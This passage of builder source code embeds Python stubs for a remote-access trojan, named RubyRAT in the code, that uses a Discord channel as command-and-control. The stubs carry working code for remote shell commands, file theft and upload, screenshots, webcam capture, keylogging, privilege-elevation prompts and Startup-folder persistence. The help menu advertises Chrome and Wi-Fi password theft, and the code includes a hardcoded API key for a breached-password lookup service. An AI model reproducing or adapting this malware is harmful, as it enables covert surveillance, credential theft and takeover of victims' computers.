volume_amount * 655\r\n\r\n                    try:\r\n                        command = f\"C:\\\\Users\\\\Public\\\\nircmd.exe setsysvolume {volume_level}\"  # Update the path here\r\n                        os.system(command)\r\n                        await ctx.send(f\"Volume changed to {volume_amount}%.\")\r\n                    except Exception as e:\r\n                        await ctx.send(f\"An error occurred while changing the volume: {e}\")\r\n                else:\r\n                    await ctx.send(\"Volume amount must be between 0 and 100.\")\r\n            else:\r\n                await ctx.send(\"NirCMD is not installed, installing it now!\")\r\n\r\n                # Install NirCMD om man inte har det\r\n                installNirsoft(\"https://www.nirsoft.net/utils/nircmd.zip\", \"nircmd.exe\")\r\n\r\n                await ctx.send(\"NirCMD has been installed. Try running the command again now.\")\r\n        except ValueError:\r\n            await ctx.send(\"Invalid volume amount. Please provide a number between 0 and 100.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                await ctx.send(\"Client is using Windows...\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        await ctx.send(\"Client has the **.exe** extension on payload.\")\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            await ctx.send(\"Client has the **.py** extension on payload.\")\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            await ctx.send(\"Created PythonScripts directory at **\" + public_folder + \"**\")\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n                            await ctx.send(\"Copied .py file from **\" + script_path + \"** to **\" + duplicate_script_path + \"**\")\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                            await ctx.send(f\"Batch script created at: **{batch_script_path}**\")\r\n                        elif script_path.endswith('.pyw'):\r\n                            await ctx.send(\"Client has the **.pyw** extension on payload.\")\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            await ctx.send(\"Created PythonScripts directory at **\" + public_folder + \"**\")\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.pyw\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n                            await ctx.send(\"Copied .pyw file from **\" + script_path + \"** to **\" + duplicate_script_path + \"**\")\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                            await ctx.send(f\"Batch script created at: **{batch_script_path}**\")\r\n                        else:\r\n                            await ctx.send(\"Client has the **.exe** extension on payload.\")\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: **{exe_link_path}**\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                await ctx.send(\"Client is using Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    secure_delete_file(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                    await ctx.send(f\"Batch script removed: **{batch_script_path}**\")\r\n                if os.path.exists(exe_link_path):\r\n                    secure_delete_file(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n                    await ctx.send(f\"Executable link removed: **{exe_link_path}**\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if ctx.channel == created_channel:\r\n        if is_admin():\r\n            await ctx.send(\"User has administrative privileges.\")\r\n        else:\r\n            return await ctx.send(elevate_privileges())\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n    elif not ctx.messege.attachments:\r\n        await ctx.send(f\"File did not upload, you did not attach any files...\")\r\n\r\n# Function to generate a Fernet key from a password\r\ndef generate_key_from_password(password, salt=None):\r\n    if salt is None:\r\n        salt = os.urandom(16)\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        iterations=100000,  # You can adjust the number of iterations as needed\r\n        salt=salt,\r\n        length=32  # Length of the derived key\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\r\n    return key, salt\r\n\r\n# Function to encrypt a file\r\ndef encrypt_file(input_file, password):\r\n    try:\r\n        key, salt = generate_key_from_password(password)\r\n        fernet = Fernet(key)\r\n        \r\n        with open(input_file, 'rb') as file:\r\n            file_data = file.read()\r\n        \r\n        encrypted_data = fernet.encrypt(file_data)\r\n        \r\n        # Use the same filename for the encrypted file\r\n        with open(input_file, 'wb') as encrypted_file:\r\n            encrypted_file.write(salt + encrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n# Function to decrypt a file\r\ndef decrypt_file(input_file, password):\r\n    try:\r\n        with open(input_file, 'rb') as encrypted_file:\r\n            salt = encrypted_file.read(16)  # Read the salt\r\n            encrypted_data = encrypted_file.read()\r\n        \r\n        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key\r\n        \r\n        fernet = Fernet(key)\r\n        decrypted_data = fernet.decrypt(encrypted_data)\r\n        \r\n        # Use the same filename for the decrypted file\r\n        with open(input_file, 'wb') as decrypted_file:\r\n            decrypted_file.write(decrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n@bot.command()\r\nasync def encrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        encrypted_file_name = encrypt_file(input_file, password)\r\n        await ctx.send(f'File encrypted and saved as {encrypted_file_name}')\r\n        return encrypted_file_name\r\n\r\n@bot.command()\r\nasync def decrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        decrypted_file_name = decrypt_file(input_file, password)\r\n        if decrypted_file_name != \"Invalid token (key or password)\":\r\n            await ctx.send(f'File decrypted and saved as {decrypted_file_name}')\r\n        else:\r\n            await ctx.send(decrypted_file_name)\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n        info.append(f\"Public IP: {GetPublicIP()}\")\r\n        info.append(f\"Keylogger Activated: {is_logging}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef GetPublicIP():\r\n    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address\r\n    return ip_address\r\n\r\ndef GetLocalIP():\r\n    private_ip = socket.gethostbyname(socket.gethostname())\r\n    return private_ip\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        admin_pass = ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        if admin_pass > 32:\r\n            return \"Success! You should recive a new connection with a Elevated Client.\" and os._exit(0)\r\n        else:\r\n            return \"User pressed \\\"No\\\". Privilege elevation not successful\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n    \r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges already...\")\r\n    else:\r\n        print(\"User does not have administrative privileges. Requesting it now!\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    if has_persistence():\r\n        print(\"Client already has persistence, there is no need to install again.\")\r\n    else:\r\n        print(\"Trying to install on start...\")\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.9.5")
            {
                originalStub = "import os\r\nimport platform\r\nimport subprocess\r\nimport io\r\nimport socket\r\nimport sys\r\nimport shutil\r\nimport base64\r\nimport ctypes\r\nimport zipfile\r\nimport importlib\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n\r\n# List of required modules and their corresponding import names\r\nrequired_modules = {\r\n    'psutil': 'psutil',\r\n    'discord': 'discord',\r\n    'pyautogui': 'pyautogui',\r\n    'pillow': 'PIL',\r\n    'opencv-python-headless': 'cv2',\r\n    'pynput': 'pynput',\r\n    'requests': 'requests',\r\n    'psutil': 'psutil',\r\n    'cryptography': 'cryptography',\r\n    'pygetwindow': 'pygetwindow',\r\n    'googlemaps': 'googlemaps',\r\n    'tkinter': 'tkinter',\r\n    'mb': 'mb',\r\n    'pywin32': 'win32crypt',\r\n    'pycryptodomex': 'Cryptodome.Cipher',\r\n    'winreg': 'winreg',\r\n}\r\n\r\n# Additional required module\r\nmissing_modules = []\r\n\r\nfor module, import_name in required_modules.items():\r\n    try:\r\n        # Attempt to import the module\r\n        importlib.import_module(import_name)\r\n    except ImportError:\r\n        # Module is missing, add it to the missing_modules list\r\n        missing_modules.append(module)\r\n\r\n# Check and install required modules if needed\r\nif missing_modules:\r\n    missing_modules_str = \", \".join(missing_modules)\r\n    print(f\"Some required modules are missing: {missing_modules_str}\")\r\n    print(\"Installing missing modules...\")\r\n    try:\r\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules_str.split(', '))\r\n        print(\"Modules installed successfully!\")\r\n        # Determine the script filename dynamically\r\n        script_filename = sys.argv[0]\r\n\r\n        # Build the command to run the script with arguments\r\n        script_command = [sys.executable, script_filename]\r\n\r\n        # Start a new process to run the script\r\n        subprocess.Popen(script_command)\r\n\r\n        # Exit the current script\r\n        sys.exit()\r\n    except Exception as e:\r\n        print(\"An error occurred while installing modules:\", e)\r\n        exit(1)\r\nelse:\r\n    print(\"All required modules are already installed.\")\r\n\r\n\r\nimport discord\r\nfrom discord.ext import commands\r\nimport requests\r\nimport pyautogui\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom pynput import keyboard\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom PIL import Image\r\nimport cv2\r\nimport pygetwindow as gw\r\nimport psutil\r\nimport googlemaps\r\nfrom tkinter import messagebox as mb\r\nimport win32crypt\r\nfrom Cryptodome.Cipher import AES\r\nimport csv\r\nimport json\r\nimport shutil\r\nimport base64\r\nimport sqlite3\r\nimport socket\r\nimport winreg\r\nfrom pathlib import Path\r\n\r\n\r\n# Settings for build\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\ncategorieName = \"" + txtCategorie.Text + "\"\r\nGOOGLE_API_KEY = \"" + txtGoogleAPI.Text + "\"\r\n\r\n# Settings for presistence\r\nregistryName = \"" + txtPreReg.Text + "\"\r\ntaskName = \"" + txtPreTask.Text + "\"\r\nstartupName = \"" + txtPreStart.Text + "\"\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    # Create encryption key\r\n    key = Fernet.generate_key()\r\n    global cipher_suite\r\n    cipher_suite = Fernet(key)\r\n\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n\r\n    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address\r\n    print(f'Public IP Address: {ip_address}')\r\n    \r\n    ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes\r\n\r\n    # Create the perfect name for chat\r\n    channel_name = f\"{system_username}-{ip_address_with_dashes}\"\r\n    channel_name_lowercase = channel_name.replace('.', '').lower()\r\n    \r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n\r\n    category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one\r\n    print(f'Category Name: {categorieName}')\r\n    \r\n    # Execute the remove_channels function with the created_channel and channel_name\r\n    await remove_channels(guild, channel_name_lowercase)\r\n\r\n    # Find other active RubyRAT clients on local machine\r\n    try:\r\n        active_rubyRATs = await find_rubyrats()  # Await the coroutine here\r\n        if len(active_rubyRATs) > 0:\r\n            print(\"Found Python processes:\")\r\n            for process in active_rubyRATs:\r\n                print(f\"Process ID: {process['pid']}, Name: {process['name']}\")\r\n                print(f\"Trying to kill process: {process}\")\r\n                await kill_process(process['pid'])  # Kill the process\r\n        else:\r\n            print(\"No Python processes found.\")\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n    # Kill them...\r\n\r\n    # Create a new text channel with the unique name\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(channel_name, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(channel_name)\r\n    print(f'Created Channel Name: {created_channel.name}')\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**\")\r\n\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\nasync def remove_channels(guild, ChannelName):\r\n    # Find the category with the specified name\r\n    category = discord.utils.get(guild.categories, name=categorieName)\r\n\r\n    if category is not None:\r\n        # Iterate through text channels within the category\r\n        for channel in category.text_channels:\r\n            if channel.name == ChannelName:\r\n                #await channel.send('!kill2')\r\n                #print(f\"Sent '!kill2' to channel: {channel.name}\")\r\n\r\n                #await asyncio.sleep(5)\r\n                await channel.delete()\r\n                print(f\"Deleted channel: {channel.name}\")\r\n    else:\r\n        print(f\"Category '{categorieName}' not found in this server.\")\r\n\r\nasync def find_rubyrats():\r\n    try:\r\n        print(\"Trying to find RubyRATs...\")\r\n        python_processes = []\r\n\r\n        # Get the current process ID of the script\r\n        current_process_id = os.getpid()\r\n\r\n        for process in psutil.process_iter(['pid', 'name']):\r\n            process_info = process.info\r\n            if \"python\" in process_info[\"name\"].lower() and process_info[\"pid\"] != current_process_id:\r\n                # Check if the process name contains \"python\" and exclude the script's own process\r\n                python_processes.append(process_info)\r\n\r\n        return python_processes\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n        return []\r\n\r\nasync def kill_process(pid):\r\n    try:\r\n        process = psutil.Process(pid)\r\n        process.terminate()  # Terminate the process\r\n        print(f\"Killed process with PID {pid}\")\r\n    except psutil.NoSuchProcess:\r\n        print(f\"Process with PID {pid} not found.\")\r\n    except Exception as e:\r\n        print(f\"An error occurred while killing the process with PID {pid}: {e}\")\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!help':\r\n        help_messages = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!help` - Show this menu.\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!version` - Prints out current version.\\n\",\r\n        \"`!restart` - Will disconnect and then hopefully reconnect the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\",\r\n        \"`!geolocate` - Calculates position using google maps API.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!better_install` - Gets presistence on system with 3 diffrent methods. (May need admin)\\n\"\r\n        \"`!better_uninstall` - Removes 3 diffrent methods of presistence from client system. (May need admin)\\n\"\r\n        \"`!better_check` - Checks if 3 diffrent methods of presistence is active on client system. (May need admin)\\n\"\r\n        \"`!history` - Gather and download all web history from client.\\n\",\r\n        \"`!volume <volume_procent>` - Changes volume to the given procentage.\\n\"\r\n        \"`!dumplog` - Sends a file containing the keyloggers findings to C2.\\n\"\r\n        \"`!startlog` - Start the keylogging.\\n\"\r\n        \"`!stoplog` - Stop the keylogging.\\n\"\r\n        \"`!encrypt <filename> <password>` - Encrypt a file with a special password.\\n\"\r\n        \"`!decrypt <filename> <password>` - Decrypt a file with the special password.\\n\",\r\n        \"`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n        \"`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\\n\"\r\n        \"`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\\n\"\r\n        \"`!messagebox <error\\warning\\info> <title> <content>` - Sends a custom made messagebox to client.\\n\",\r\n        \"`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \\\"dir\\\")\\n\"\r\n        )\r\n        for message in help_messages:\r\n            await ctx.send(message)    \r\n\r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot using pyautogui\r\n            screenshot = pyautogui.screenshot()\r\n\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            \r\n            # Remove the temporary file\r\n            os.remove(screenshot_path)\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Initialize the webcam capture\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n\r\n            if cap.isOpened():\r\n                # Capture a single frame from the webcam\r\n                ret, frame = cap.read()\r\n\r\n                if ret:\r\n                    # Save the captured image to a file\r\n                    image_path = 'webcam_image.png'\r\n                    cv2.imwrite(image_path, frame)\r\n\r\n                    # Upload the image to Discord\r\n                    await ctx.send(file=discord.File(image_path))\r\n\r\n                    # Remove the temporary image file\r\n                    os.remove(image_path)\r\n\r\n                else:\r\n                    await ctx.send(\"Failed to capture image from webcam.\")\r\n            else:\r\n                await ctx.send(\"Webcam not available.\")\r\n\r\n            # Release the webcam\r\n            cap.release()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def version(ctx):\r\n    if ctx.channel == created_channel:    \r\n        print(\"Version is 1.9\")\r\n        await ctx.send(\"Current version is 1.9\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\n@bot.command()\r\nasync def SearchForPasswords(ctx, email):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            url = \"https://breachdirectory.p.rapidapi.com/\"\r\n\r\n            querystring = {f\"func\":\"password\",\"term\":\"{email}\"}\r\n\r\n            headers = {\r\n                \"X-RapidAPI-Key\": \"c8f932324emsha140e7ddc6cd6a8p1045a7jsnb5a89cca82b8\",\r\n                \"X-RapidAPI-Host\": \"breachdirectory.p.rapidapi.com\"\r\n            }\r\n\r\n            response = requests.get(url, headers=headers, params=querystring)\r\n\r\n            print(response.json())\r\n            await ctx.send(response.json())\r\n        except:\r\n            print(\"Something went wrong...\")\r\n            await ctx.send(\"Something went wrong...\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# 